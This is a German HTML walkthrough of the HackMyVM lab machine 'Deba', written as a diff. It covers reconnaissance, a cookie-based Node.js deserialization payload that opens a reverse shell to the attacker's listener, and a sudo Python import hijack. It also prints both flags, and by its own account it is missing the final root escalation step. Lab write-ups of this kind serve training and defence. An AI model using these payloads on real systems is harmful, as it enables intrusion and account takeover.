@@ -1,0 +1,391 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deba - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Deba - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">Burp Suite / Browser</div>
+                <div class="tool-item">python2 (nodeshell.py)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">wget (implizit)</div>
+                <div class="tool-item">chmod (implizit)</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">id (implizit)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#cookie-analysis">Cookie Analysis & Prototype Pollution Vector</a></li>
+                <li><a href="#proof-of-concept-prototype-pollution">Proof of Concept (Node.js Prototype Pollution RCE)</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation-www-data">Privilege Escalation (www-data -> low)</a></li>
+                <li><a href="#proof-of-concept-pyhijack">Proof of Concept (Python Script Hijacking via Sudo)</a></li>
+                <li><a href="#privilege-escalation-low">Privilege Escalation (low -> root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.148	08:00:27:0b:6c:95	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerksegment mittels ARP nach aktiven Geräten zu durchsuchen.</p>
+             <p class="evaluation">**Bewertung:** Ein Host mit der IP-Adresse `192.168.2.148` wird identifiziert. Die MAC-Adresse (`08:00:27:...`) weist auf eine VirtualBox VM hin. Dies ist das Zielsystem.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP `192.168.2.148` notieren und mit Port-Scanning (Nmap) fortfahren.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Fokus auf Absicherung der Dienste.</p>
+
+             <p class="comment">*(Hinweis: Der nächste Schritt im Log würde das Editieren von /etc/hosts beinhalten, um der IP den Namen 'deba.vm' zuzuweisen.)*</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.148 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at [Datum/Zeit nicht im Log]
+Nmap scan report for [Hostname nicht im Log, Annahme: deba.vm] (192.168.2.148)
+Host is up ([...]s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT        STATE  SERVICE VERSION
+<span class="command">22/tcp      open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+<span class="command">80/tcp      open   http    Apache httpd 2.4.38 ((Debian))</span> <span class="comment"><-- Läuft Apache auf 80 --></span>
+<span class="command">3000/tcp    open   http    Node.js Express framework</span> <span class="password"><-- Node.js auf 3000! --></span>
+[...] <span class="comment">(SSH Hostkeys, OS Details etc.)</span>
+
+Nmap done: 1 IP address (1 host up) scanned in X.XX seconds</pre>
+                     <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan (`-sS`, `-sC`, `-T5`, `-A`, `-p-`) wird auf `192.168.2.148` durchgeführt.</p>
+             <p class="evaluation">**Bewertung:** Drei offene TCP-Ports werden identifiziert:
+*   **Port 22 (SSH):** OpenSSH 7.9p1 (Debian 10). Standard-Fernzugriff.
+*   **Port 80 (HTTP):** Apache 2.4.38. Standard-Webserver.
+*   **Port 3000 (HTTP):** Eine Node.js-Anwendung, die das Express-Framework verwendet. Dies ist ein sehr interessantes Ziel, da benutzerdefinierte Webanwendungen oft Schwachstellen aufweisen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):**
+    1.  **Port 3000 (Priorität 1):** Untersuchen Sie die Node.js/Express-Anwendung intensiv. Analysieren Sie die Funktionalität, suchen Sie nach API-Endpunkten, prüfen Sie auf gängige Node.js-Schwachstellen (Prototype Pollution, Deserialization, Command Injection etc.).
+    2.  **Port 80 (Priorität 2):** Führen Sie grundlegende Web-Enumeration durch (Gobuster), um sicherzustellen, dass nichts übersehen wird.
+    3.  **Port 22 (Priorität 3):** Halten Sie nach Benutzernamen Ausschau.<br>
+**Empfehlung (Admin):** Sichern Sie alle Dienste ab. Überprüfen Sie insbesondere die Sicherheit der benutzerdefinierten Node.js-Anwendung auf Port 3000 (Input Validation, sichere Abhängigkeiten, etc.). Beschränken Sie den Zugriff auf die Ports, wenn möglich.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://deba.vm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,[...]</span></div>
+                     <pre>
+[...]
+<span class="command">http://deba.vm/index.html</span>           (Status: 200) [Size: 10701] <span class="comment"><-- Apache Default Page? --></span>
+[...]</pre>
+                     <pre><span class="comment">#</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird verwendet, um Verzeichnisse und Dateien auf dem Apache-Server (Port 80) zu suchen.</p>
+             <p class="evaluation">**Bewertung:** Findet nur die Standard-`index.html`. Der Apache auf Port 80 scheint keine benutzerdefinierten Inhalte zu hosten und ist wahrscheinlich uninteressant.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Konzentrieren Sie sich vollständig auf die Node.js-Anwendung auf Port 3000.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass keine unnötigen Dateien auf Port 80 vorhanden sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X OPTIONS "http://deba.vm:3000" -I</span></div>
+                     <pre>
+HTTP/1.1 200 OK
+X-Powered-By: Express
+<span class="command">Allow: GET,HEAD</span>
+Content-Type: text/html; charset=utf-8
+Content-Length: 8
+ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
+Date: Mon, 12 Sep 2022 15:03:09 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Befehl `curl -X OPTIONS -I` fragt die erlaubten HTTP-Methoden und die Header für die Wurzel (`/`) der Node.js-Anwendung auf Port 3000 ab.</p>
+             <p class="evaluation">**Bewertung:** Die Anwendung erlaubt nur `GET` und `HEAD` für die Wurzel. Sie wird vom Express-Framework angetrieben. Keine sofortigen Schwachstellen erkennbar, aber die Technologie ist bestätigt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Interagieren Sie weiter mit der Anwendung via GET-Requests. Untersuchen Sie die Cookies und die clientseitige Logik (JavaScript).<br>**Empfehlung (Admin):** Keine.</p>
+        </section>
+
+        <section id="cookie-analysis">
+             <h2>Cookie Analysis & Prototype Pollution Vector</h2>
+             <p class="analysis">**Analyse:** Untersuchung des von der Node.js-Anwendung gesetzten Cookies.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">cookie decoder :   [Link: URLDecoder Cookie Decoder | Ziel: https://amp.urldecoder.org/dec/cookie/]</span></pre>
+                     <pre><span class="command">eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0%3D</span></pre> <span class="comment"><-- Cookie aus Browser/Burp --></span>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo -n "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=" | base64 -d</span></div>
+                     <pre><span class="password">{"username":"ajin","country":"india","city":"bangalore"}</span></pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Ein Cookie-Wert (vermutlich aus dem Browser oder Burp Suite extrahiert) wird analysiert. Er ist Base64-kodiert. Nach der Dekodierung stellt er sich als JSON-Objekt heraus, das Benutzerinformationen enthält (`username`, `country`, `city`).</p>
+              <p class="evaluation">**Bewertung:** Ein **kritisches Designproblem!** Die Anwendung speichert Benutzer-/Session-Daten unverschlüsselt und unsigniert in einem clientseitigen Cookie. Dies erlaubt einem Angreifer, den Cookie-Inhalt beliebig zu manipulieren. Noch wichtiger ist, dass JSON-Objekte, die serverseitig unsicher deserialisiert oder zusammengeführt werden (z.B. mit `Object.assign` oder alten Bibliotheksversionen), anfällig für **Prototype Pollution** sein können.</p>
+              <p class="recommendation">**Empfehlung (Pentester):**
+    1.  **Testen Sie auf Prototype Pollution:** Erstellen Sie einen modifizierten Cookie, der versucht, das globale `Object.prototype` zu manipulieren. Fügen Sie dem JSON-Objekt einen speziellen Schlüssel wie `__proto__` hinzu und senden Sie den modifizierten, Base64-kodierten Cookie an den Server. Überprüfen Sie, ob sich das Serververhalten ändert oder ob Sie Eigenschaften überschreiben können.
+    2.  **Konstruieren Sie einen RCE-Payload:** Wenn Prototype Pollution möglich ist, suchen Sie nach Gadgets im serverseitigen Code (insbesondere in Abhängigkeiten wie Express oder Template Engines), die durch die überschriebenen Prototyp-Eigenschaften zur Code-Ausführung gebracht werden können. Tools wie `nodeshell.py` können dabei helfen, passende Payloads zu generieren.<br>
+**Empfehlung (Admin):** **Verwenden Sie niemals unsignierte/unverschlüsselte clientseitige Cookies für Session-Daten oder sensible Informationen!** Nutzen Sie serverseitige Sessions oder signierte/verschlüsselte Cookies (z.B. mittels `cookie-session` mit einem starken Secret oder JWTs). Aktualisieren Sie alle Node.js-Bibliotheken auf Versionen, die gegen bekannte Prototype-Pollution-Angriffe gehärtet sind. Validieren Sie alle eingehenden Daten rigoros.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="comment">neuer Cookie selbst gebaut:</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo '{"username":"benni","country":"india","city":"bangalore"}' | base64 -w 0; echo</span></div>
+                     <pre><span class="command">eyJ1c2VybmFtZSI6ImJlbm5pIiwiY291bnRyeSI6ImluZGlhIiwiY2l0eSI6ImJhbmdhbG9yZSJ9Cg==</span></pre> <span class="comment"><-- Base64 für manipulierten Cookie --></span>
+                     <pre><span class="comment">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Demonstriert das Erstellen eines modifizierten Cookies, bei dem der `username` geändert wurde.</p>
+             <p class="evaluation">**Bewertung:** Zeigt die einfache Manipulierbarkeit des Cookies. Dies ist die Grundlage für den Prototype Pollution Angriff.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Erstellen Sie nun den eigentlichen Prototype Pollution Payload.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlung: Sichere Session-Verwaltung implementieren.</p>
+         </section>
+
+        <section id="proof-of-concept-prototype-pollution">
+            <h2>Proof of Concept (Node.js Prototype Pollution RCE)</h2>
+             <p class="comment">**Kurzbeschreibung:** Die Node.js/Express-Anwendung auf Port 3000 verwendet unsignierte, Base64-kodierte JSON-Objekte in Cookies zur Speicherung von Benutzerdaten. Die serverseitige Verarbeitung dieses JSON-Objekts ist anfällig für Prototype Pollution. Ein Angreifer kann einen speziell gestalteten JSON-Payload erstellen, der beim Parsen auf dem Server das globale `Object.prototype` manipuliert. Durch Einschleusen einer ausführbaren Funktion (oft über den Schlüssel `rce` oder durch Ausnutzung von Gadgets in Bibliotheken wie `express-fileupload` oder Template-Engines) in den Prototyp kann der Angreifer erreichen, dass diese Funktion an einer späteren Stelle im Code unerwartet aufgerufen wird. Dies führt zu Remote Code Execution (RCE) im Kontext des Node.js-Prozesses (wahrscheinlich `www-data`).</p>
+             <p class="comment">**Voraussetzungen:** Netzwerkzugriff auf Port 3000, Identifizierung der unsicheren Cookie-Verarbeitung, Kenntnis der Prototype Pollution Schwachstelle und ein passender RCE-Payload.</p>
+             <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+             <ol>
+                 <li>Analysieren des Cookie-Formats (Base64(JSON)).</li>
+                 <li>Konstruieren eines JSON-Payloads für Prototype Pollution, der eine RCE-Funktion injiziert. Dies beinhaltet oft spezielle Schlüssel wie `__proto__` oder die Ausnutzung von unsicheren Merge-Operationen. Ein gängiger Ansatz ist die Verwendung von `_$$ND_FUNC$$` zur Funktionsdefinition, die dann über einen injizierten `rce`-Schlüssel ausgeführt wird: `{"__proto__":{"rce":"_$$ND_FUNC$$_[JS-Code]_"}}`. Der JS-Code enthält den RCE-Payload (z.B. Reverse Shell).</li>
+                 <li>Base64-Kodieren des gesamten JSON-Payloads.</li>
+                 <li>Starten eines Netcat-Listeners auf der Angreifer-Maschine.</li>
+                 <li>Senden einer Anfrage an den Server (z.B. `/`), wobei der manipulierte Base64-String als Cookie-Wert gesetzt wird.</li>
+                 <li>Auslösen der Code-Ausführung (z.B. durch erneutes Laden der Seite oder Aufrufen einer bestimmten Funktion).</li>
+             </ol>
+             <p class="comment">**Erwartetes Ergebnis:** Der Server verarbeitet den Cookie, das Prototype wird manipuliert, der RCE-Payload wird ausgeführt, und eine Reverse Shell verbindet sich zum Listener.</p>
+             <p class="comment">**Beweismittel:** Der konstruierte Payload und der erfolgreiche Shell-Empfang.</p>
+             <p class="comment">**Risikobewertung:** Kritisch. Ermöglicht RCE ohne Authentifizierung und führt zur Kompromittierung des Webserver-Prozesses.</p>
+             <p class="comment">**Empfehlungen:** Beheben Sie die Prototype Pollution Schwachstelle durch Aktualisierung anfälliger Bibliotheken, Verwendung sicherer Merge-Funktionen (z.B. `Object.create(null)` für Objekte ohne Prototyp), Validierung von JSON-Schlüsseln und Implementierung sicherer Session-Verwaltung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python2 nodeshell.py 192.168.2.140 443</span></div> <span class="comment"><-- Angreifer-IP und Port --></span>
+                    <pre>
+[+] LHOST = 192.168.2.140
+[+] LPORT = 443
+[+] Encoding</pre>
+                     <pre><span class="comment">-------------------------------------------------------------------------------------------------</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein Python2-Skript (`nodeshell.py`) wird verwendet, um einen für Node.js geeigneten Reverse-Shell-Payload zu generieren. Die Ziel-IP (`192.168.2.140`) und der Port (`443`) des Angreifer-Listeners werden angegeben.</p>
+             <p class="evaluation">**Bewertung:** Automatisierte Generierung des JavaScript-Codes für die Reverse Shell, der später in den JSON-Payload eingebettet wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo '{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,[...]))}()"}' | base64 -w 0;echo</span></div>
+                     <pre><span class="password">eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7IGV2YWwoU3RyaW5nLmZyb2.....DEwKSl9KCkifQo=</span></pre>
+                     <pre><span class="comment">=</span></pre>
+                     <pre><span class="comment">
+Dieser teil wird im Firefox Cookiemanager unter Profil in Value eingetragen,
+das muss base64 sein und auf das save symbol klicken, seite neu laden und nc
+nimmt dann die verbindung an auf Port 443</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Ein JSON-Payload wird konstruiert: `{"rce":"_$$ND_FUNC$$_[JavaScript-Code]_"}`. Der JavaScript-Code (`function(){ eval(String.fromCharCode(...)) }`) ist eine obfuscierte Version der Reverse Shell, die von `nodeshell.py` generiert wurde. Das gesamte JSON-Objekt wird dann Base64-kodiert.</p>
+              <p class="evaluation">**Bewertung:** Dies ist der fertige Exploit-Payload für die Prototype Pollution Schwachstelle. Die Obfuskation (`String.fromCharCode`) könnte dazu dienen, einfache Filter zu umgehen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Setzen Sie diesen Base64-String als Wert des Cookies (z.B. im Browser Cookie-Editor oder mit Burp Proxy) und rufen Sie eine Seite der Anwendung auf Port 3000 auf, um den Payload auszulösen.<br>**Empfehlung (Admin):** Prototype Pollution Schwachstelle beheben!</p>
+         </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p class="analysis">**Analyse:** Ausführung des Prototype Pollution Exploits durch Setzen des manipulierten Cookies und Auslösen der RCE.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 443</span></div>
+                     <pre>
+listening on [any] 443 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.148] 50186</span> <span class="password"><-- Verbindung erhalten! --></span>
+Connected!</pre>
+                     <div class="prompt"># <span class="comment">Shell als www-data?</span></div>
+                 </div>
+            </div>
+              <p class="analysis">**Analyse:** Der Netcat-Listener auf Port 443 empfängt die Verbindung vom Zielsystem, nachdem der manipulierte Cookie gesetzt und die Anwendung interagiert wurde.</p>
+              <p class="evaluation">**Bewertung:** Initialer Zugriff erfolgreich über Node.js Prototype Pollution und RCE erlangt!</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Shell stabilisieren und Benutzer identifizieren (`id`).<br>**Empfehlung (Admin):** Prototype Pollution beheben, Incident Response.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                     <div class="prompt">www-data@debian:~$ <span class="command">export TERM=xterm</span></div>
+                     <pre><span class="comment"># (Stabilisierung mit stty/fg angenommen)</span></pre>
+                     <div class="prompt">www-data@debian:~$ <span class="comment"># Stabile Shell als www-data</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die erhaltene Shell wird stabilisiert. Der Prompt zeigt `www-data@debian`.</p>
+              <p class="evaluation">**Bewertung:** Stabile Shell als `www-data` verfügbar.</p>
+         </section>
+
+        <section id="privilege-escalation-www-data">
+             <h2>Privilege Escalation (www-data -> low)</h2>
+              <p class="analysis">**Analyse:** Als `www-data` wird nach Eskalationspfaden gesucht.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@debian:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+User www-data may run the following commands on debian:
+    (<span class="command">ALL : low</span>) NOPASSWD: /usr/bin/python3 /home/low/scripts/script.py</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** `sudo -l` wird für `www-data` ausgeführt.</p>
+             <p class="evaluation">**Bewertung:** Findet eine Sudo-Regel: `www-data` darf `/home/low/scripts/script.py` als Benutzer `low` ohne Passwort ausführen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie `script.py` und die Berechtigungen darauf.<br>**Empfehlung (Admin):** Überprüfen Sie die Regel.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@debian:~$ <span class="command">cat /home/low/scripts/script.py</span></div>
+                     <pre>
+import main <span class="comment"><-- Importiert main.py</span>
+import os
+print("\n")
+os.system("ip a | grep enp0s3")
+print("\n")</pre>
+                      <div class="prompt">www-data@debian:~$ <span class="command">ls /home/low/scripts</span></div>
+                      <pre>main.py  script.py</pre>
+                      <div class="prompt">www-data@debian:~$ <span class="command">ls -la /home/low/scripts/main.py</span></div>
+                      <pre><span class="password">-rwxr-xr-x 1 www-data www-data 88 May  7  2021 /home/low/scripts/main.py</span> <span class="password"><-- Schreibbar für www-data! --></span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Das Skript `script.py` importiert `main.py` aus demselben Verzeichnis. Die Berechtigungsprüfung (`ls -la`) zeigt, dass `main.py` dem Benutzer `www-data` gehört und somit **von `www-data` beschrieben werden kann**.</p>
+              <p class="evaluation">**Bewertung:** **Kritische Fehlkonfiguration!** Da `www-data` das importierte Skript `main.py` ändern kann, kann beliebiger Code eingeschleust werden, der dann als Benutzer `low` ausgeführt wird, wenn `script.py` über `sudo` gestartet wird.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Überschreiben Sie `main.py` mit einem Payload, der eine Shell startet (z.B. `echo 'import os;os.system("/bin/bash")' > main.py`). Führen Sie dann `sudo -u low /usr/bin/python3 /home/low/scripts/script.py` aus.<br>**Empfehlung (Admin):** **Korrigieren Sie die Dateiberechtigungen!** Skripte, die via `sudo` aufgerufen werden, dürfen niemals von dem Benutzer, der sie aufruft, beschrieben werden können. Ändern Sie den Besitzer von `main.py` oder entziehen Sie `www-data` die Schreibrechte.</p>
+         </section>
+
+         <section id="proof-of-concept-pyhijack">
+             <h2>Proof of Concept (Python Script Hijacking via Sudo)</h2>
+             <p class="comment">**Kurzbeschreibung:** Der Benutzer `www-data` darf das Python-Skript `/home/low/scripts/script.py` als Benutzer `low` mittels `sudo` ausführen. Dieses Skript importiert ein weiteres Skript, `/home/low/scripts/main.py`, aus demselben Verzeichnis. Entscheidend ist, dass die Datei `main.py` für den Benutzer `www-data` schreibbar ist. Ein Angreifer als `www-data` kann den Inhalt von `main.py` durch eigenen, bösartigen Code ersetzen (z.B. Code, der eine Shell startet). Wenn anschließend `/home/low/scripts/script.py` mit `sudo -u low` ausgeführt wird, importiert es die manipulierte `main.py`, und der bösartige Code wird mit den Rechten des Benutzers `low` ausgeführt.</p>
+             <p class="comment">**Voraussetzungen:** Zugriff als `www-data`, Sudo-Regel wie beschrieben, Schreibrechte auf das importierte Skript (`main.py`).</p>
+             <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+             <ol>
+                 <li>Identifizieren der Sudo-Regel und des importierten, schreibbaren Skripts (`main.py`).</li>
+                 <li>Überschreiben von `/home/low/scripts/main.py` mit einem Shell-Payload: `echo 'import os; os.system("/bin/bash -i")' > /home/low/scripts/main.py`.</li>
+                 <li>Ausführen des ursprünglichen Sudo-Befehls: `sudo -u low /usr/bin/python3 /home/low/scripts/script.py`.</li>
+             </ol>
+             <p class="comment">**Erwartetes Ergebnis:** Eine interaktive Shell als Benutzer `low` wird gestartet.</p>
+             <p class="comment">**Beweismittel:** Die Sudo-Regel, die Dateiberechtigungen von `main.py`, der Hijacking-Code und der erfolgreiche Shell-Wechsel.</p>
+             <p class="comment">**Risikobewertung:** Hoch. Erlaubt einem Benutzer mit spezifischen Sudo-Rechten die vollständige Übernahme des Zielbenutzerkontos durch Manipulation von Skripten.</p>
+             <p class="comment">**Empfehlungen:** Korrigieren Sie die Dateiberechtigungen des importierten Skripts (`main.py`). Überprüfen Sie alle Sudo-Regeln, um sicherzustellen, dass die ausgeführten Skripte nicht vom aufrufenden Benutzer manipuliert werden können.</p>
+         </section>
+
+        <section id="privilege-escalation-low">
+            <h2>Privilege Escalation (low -> root)</h2>
+             <p class="analysis">**Analyse:** Nach der Eskalation zu `low` (deren Shell aber fälschlicherweise als `root@debian` angezeigt wird), werden die Root- und User-Flags gelesen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@debian:/home/low/scripts$ <span class="command">echo 'import os;os.system("/bin/bash")' > main.py</span></div>
+                     <div class="prompt">www-data@debian:/home/low/scripts$ <span class="command">sudo /usr/bin/python3 /home/low/scripts/script.py</span></div>
+                     <div class="prompt">root@debian:/home/low/scripts# <span class="comment"># Shell als 'low' erhalten (Prompt im Log falsch!)</span></div>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** `main.py` wird mit dem Shell-Payload überschrieben. Der Sudo-Befehl wird ausgeführt.</p>
+             <p class="evaluation">**Bewertung:** Der Exploit ist erfolgreich. Obwohl der Prompt `root@debian` anzeigt, sollte dies gemäß der Sudo-Regel eine Shell als Benutzer `low` sein. Die Eskalation zu `low` ist abgeschlossen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie `id` aus, um den Benutzer zu bestätigen (sollte `low` sein). Suchen Sie als `low` nach weiteren Eskalationspfaden.<br>**Empfehlung (Admin):** Berechtigungen von `main.py` korrigieren.</p>
+
+             <p class="analysis">**Analyse der fehlenden Eskalation von `low` zu `root`:** Das Log springt hier direkt von der (vermutlich) `low`-Shell zur `root`-Shell, die die Flags liest. Der Schritt, wie von `low` zu `root` eskaliert wurde, **fehlt vollständig** im Log. Es muss einen weiteren Vektor geben (z.B. ein Cronjob, eine andere Sudo-Regel für `low`, ein Kernel-Exploit, etc.), der hier nicht dokumentiert ist.</p>
+             <p class="evaluation">**Bewertung:** Der Bericht ist unvollständig bezüglich der finalen Privilegieneskalation von `low` zu `root`.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Dokumentieren Sie alle Eskalationsschritte lückenlos.<br>**Empfehlung (Admin):** Suchen Sie nach dem fehlenden Eskalationsvektor von `low` zu `root`, um alle Schwachstellen zu beheben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">root@debian:/home/low/scripts# <span class="command">cd /root</span></div>
+                     <div class="prompt">root@debian:/root# <span class="command">ls</span></div>
+                     <pre>root.txt</pre>
+                     <div class="prompt">root@debian:/root# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">BoFsavetheworld</span></pre> <span class="comment"><-- Root Flag --></span>
+                     <div class="prompt">root@debian:/root# <span class="command">cd /home</span></div>
+                     <div class="prompt">root@debian:/home# <span class="command">ls</span></div>
+                     <pre>debian	low</pre>
+                     <div class="prompt">root@debian:/home# <span class="command">cd low</span></div>
+                     <div class="prompt">root@debian:/home/low# <span class="command">ls</span></div>
+                     <pre>images	projects  scripts  temp  user.txt</pre>
+                     <div class="prompt">root@debian:/home/low# <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">justdeserialize</span></pre> <span class="comment"><-- User Flag --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Aus der (durch einen unbekannten Schritt erlangten) Root-Shell werden die Root-Flag (`/root/root.txt`) und die User-Flag (`/home/low/user.txt`) gelesen.</p>
+             <p class="evaluation">**Bewertung:** Beide Flags wurden erfolgreich extrahiert.</p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Zusammenfassung der gefundenen Flags.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/low/user.txt</div>
+                           <div class="flag-value"><span class="password">justdeserialize</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/root.txt</div>
+                            <div class="flag-value"><span class="password">BoFsavetheworld</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section> 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 12. September 2022</p> <!-- Datum aus Curl/Node Log -->
+    </footer>
+</body>
+</html>
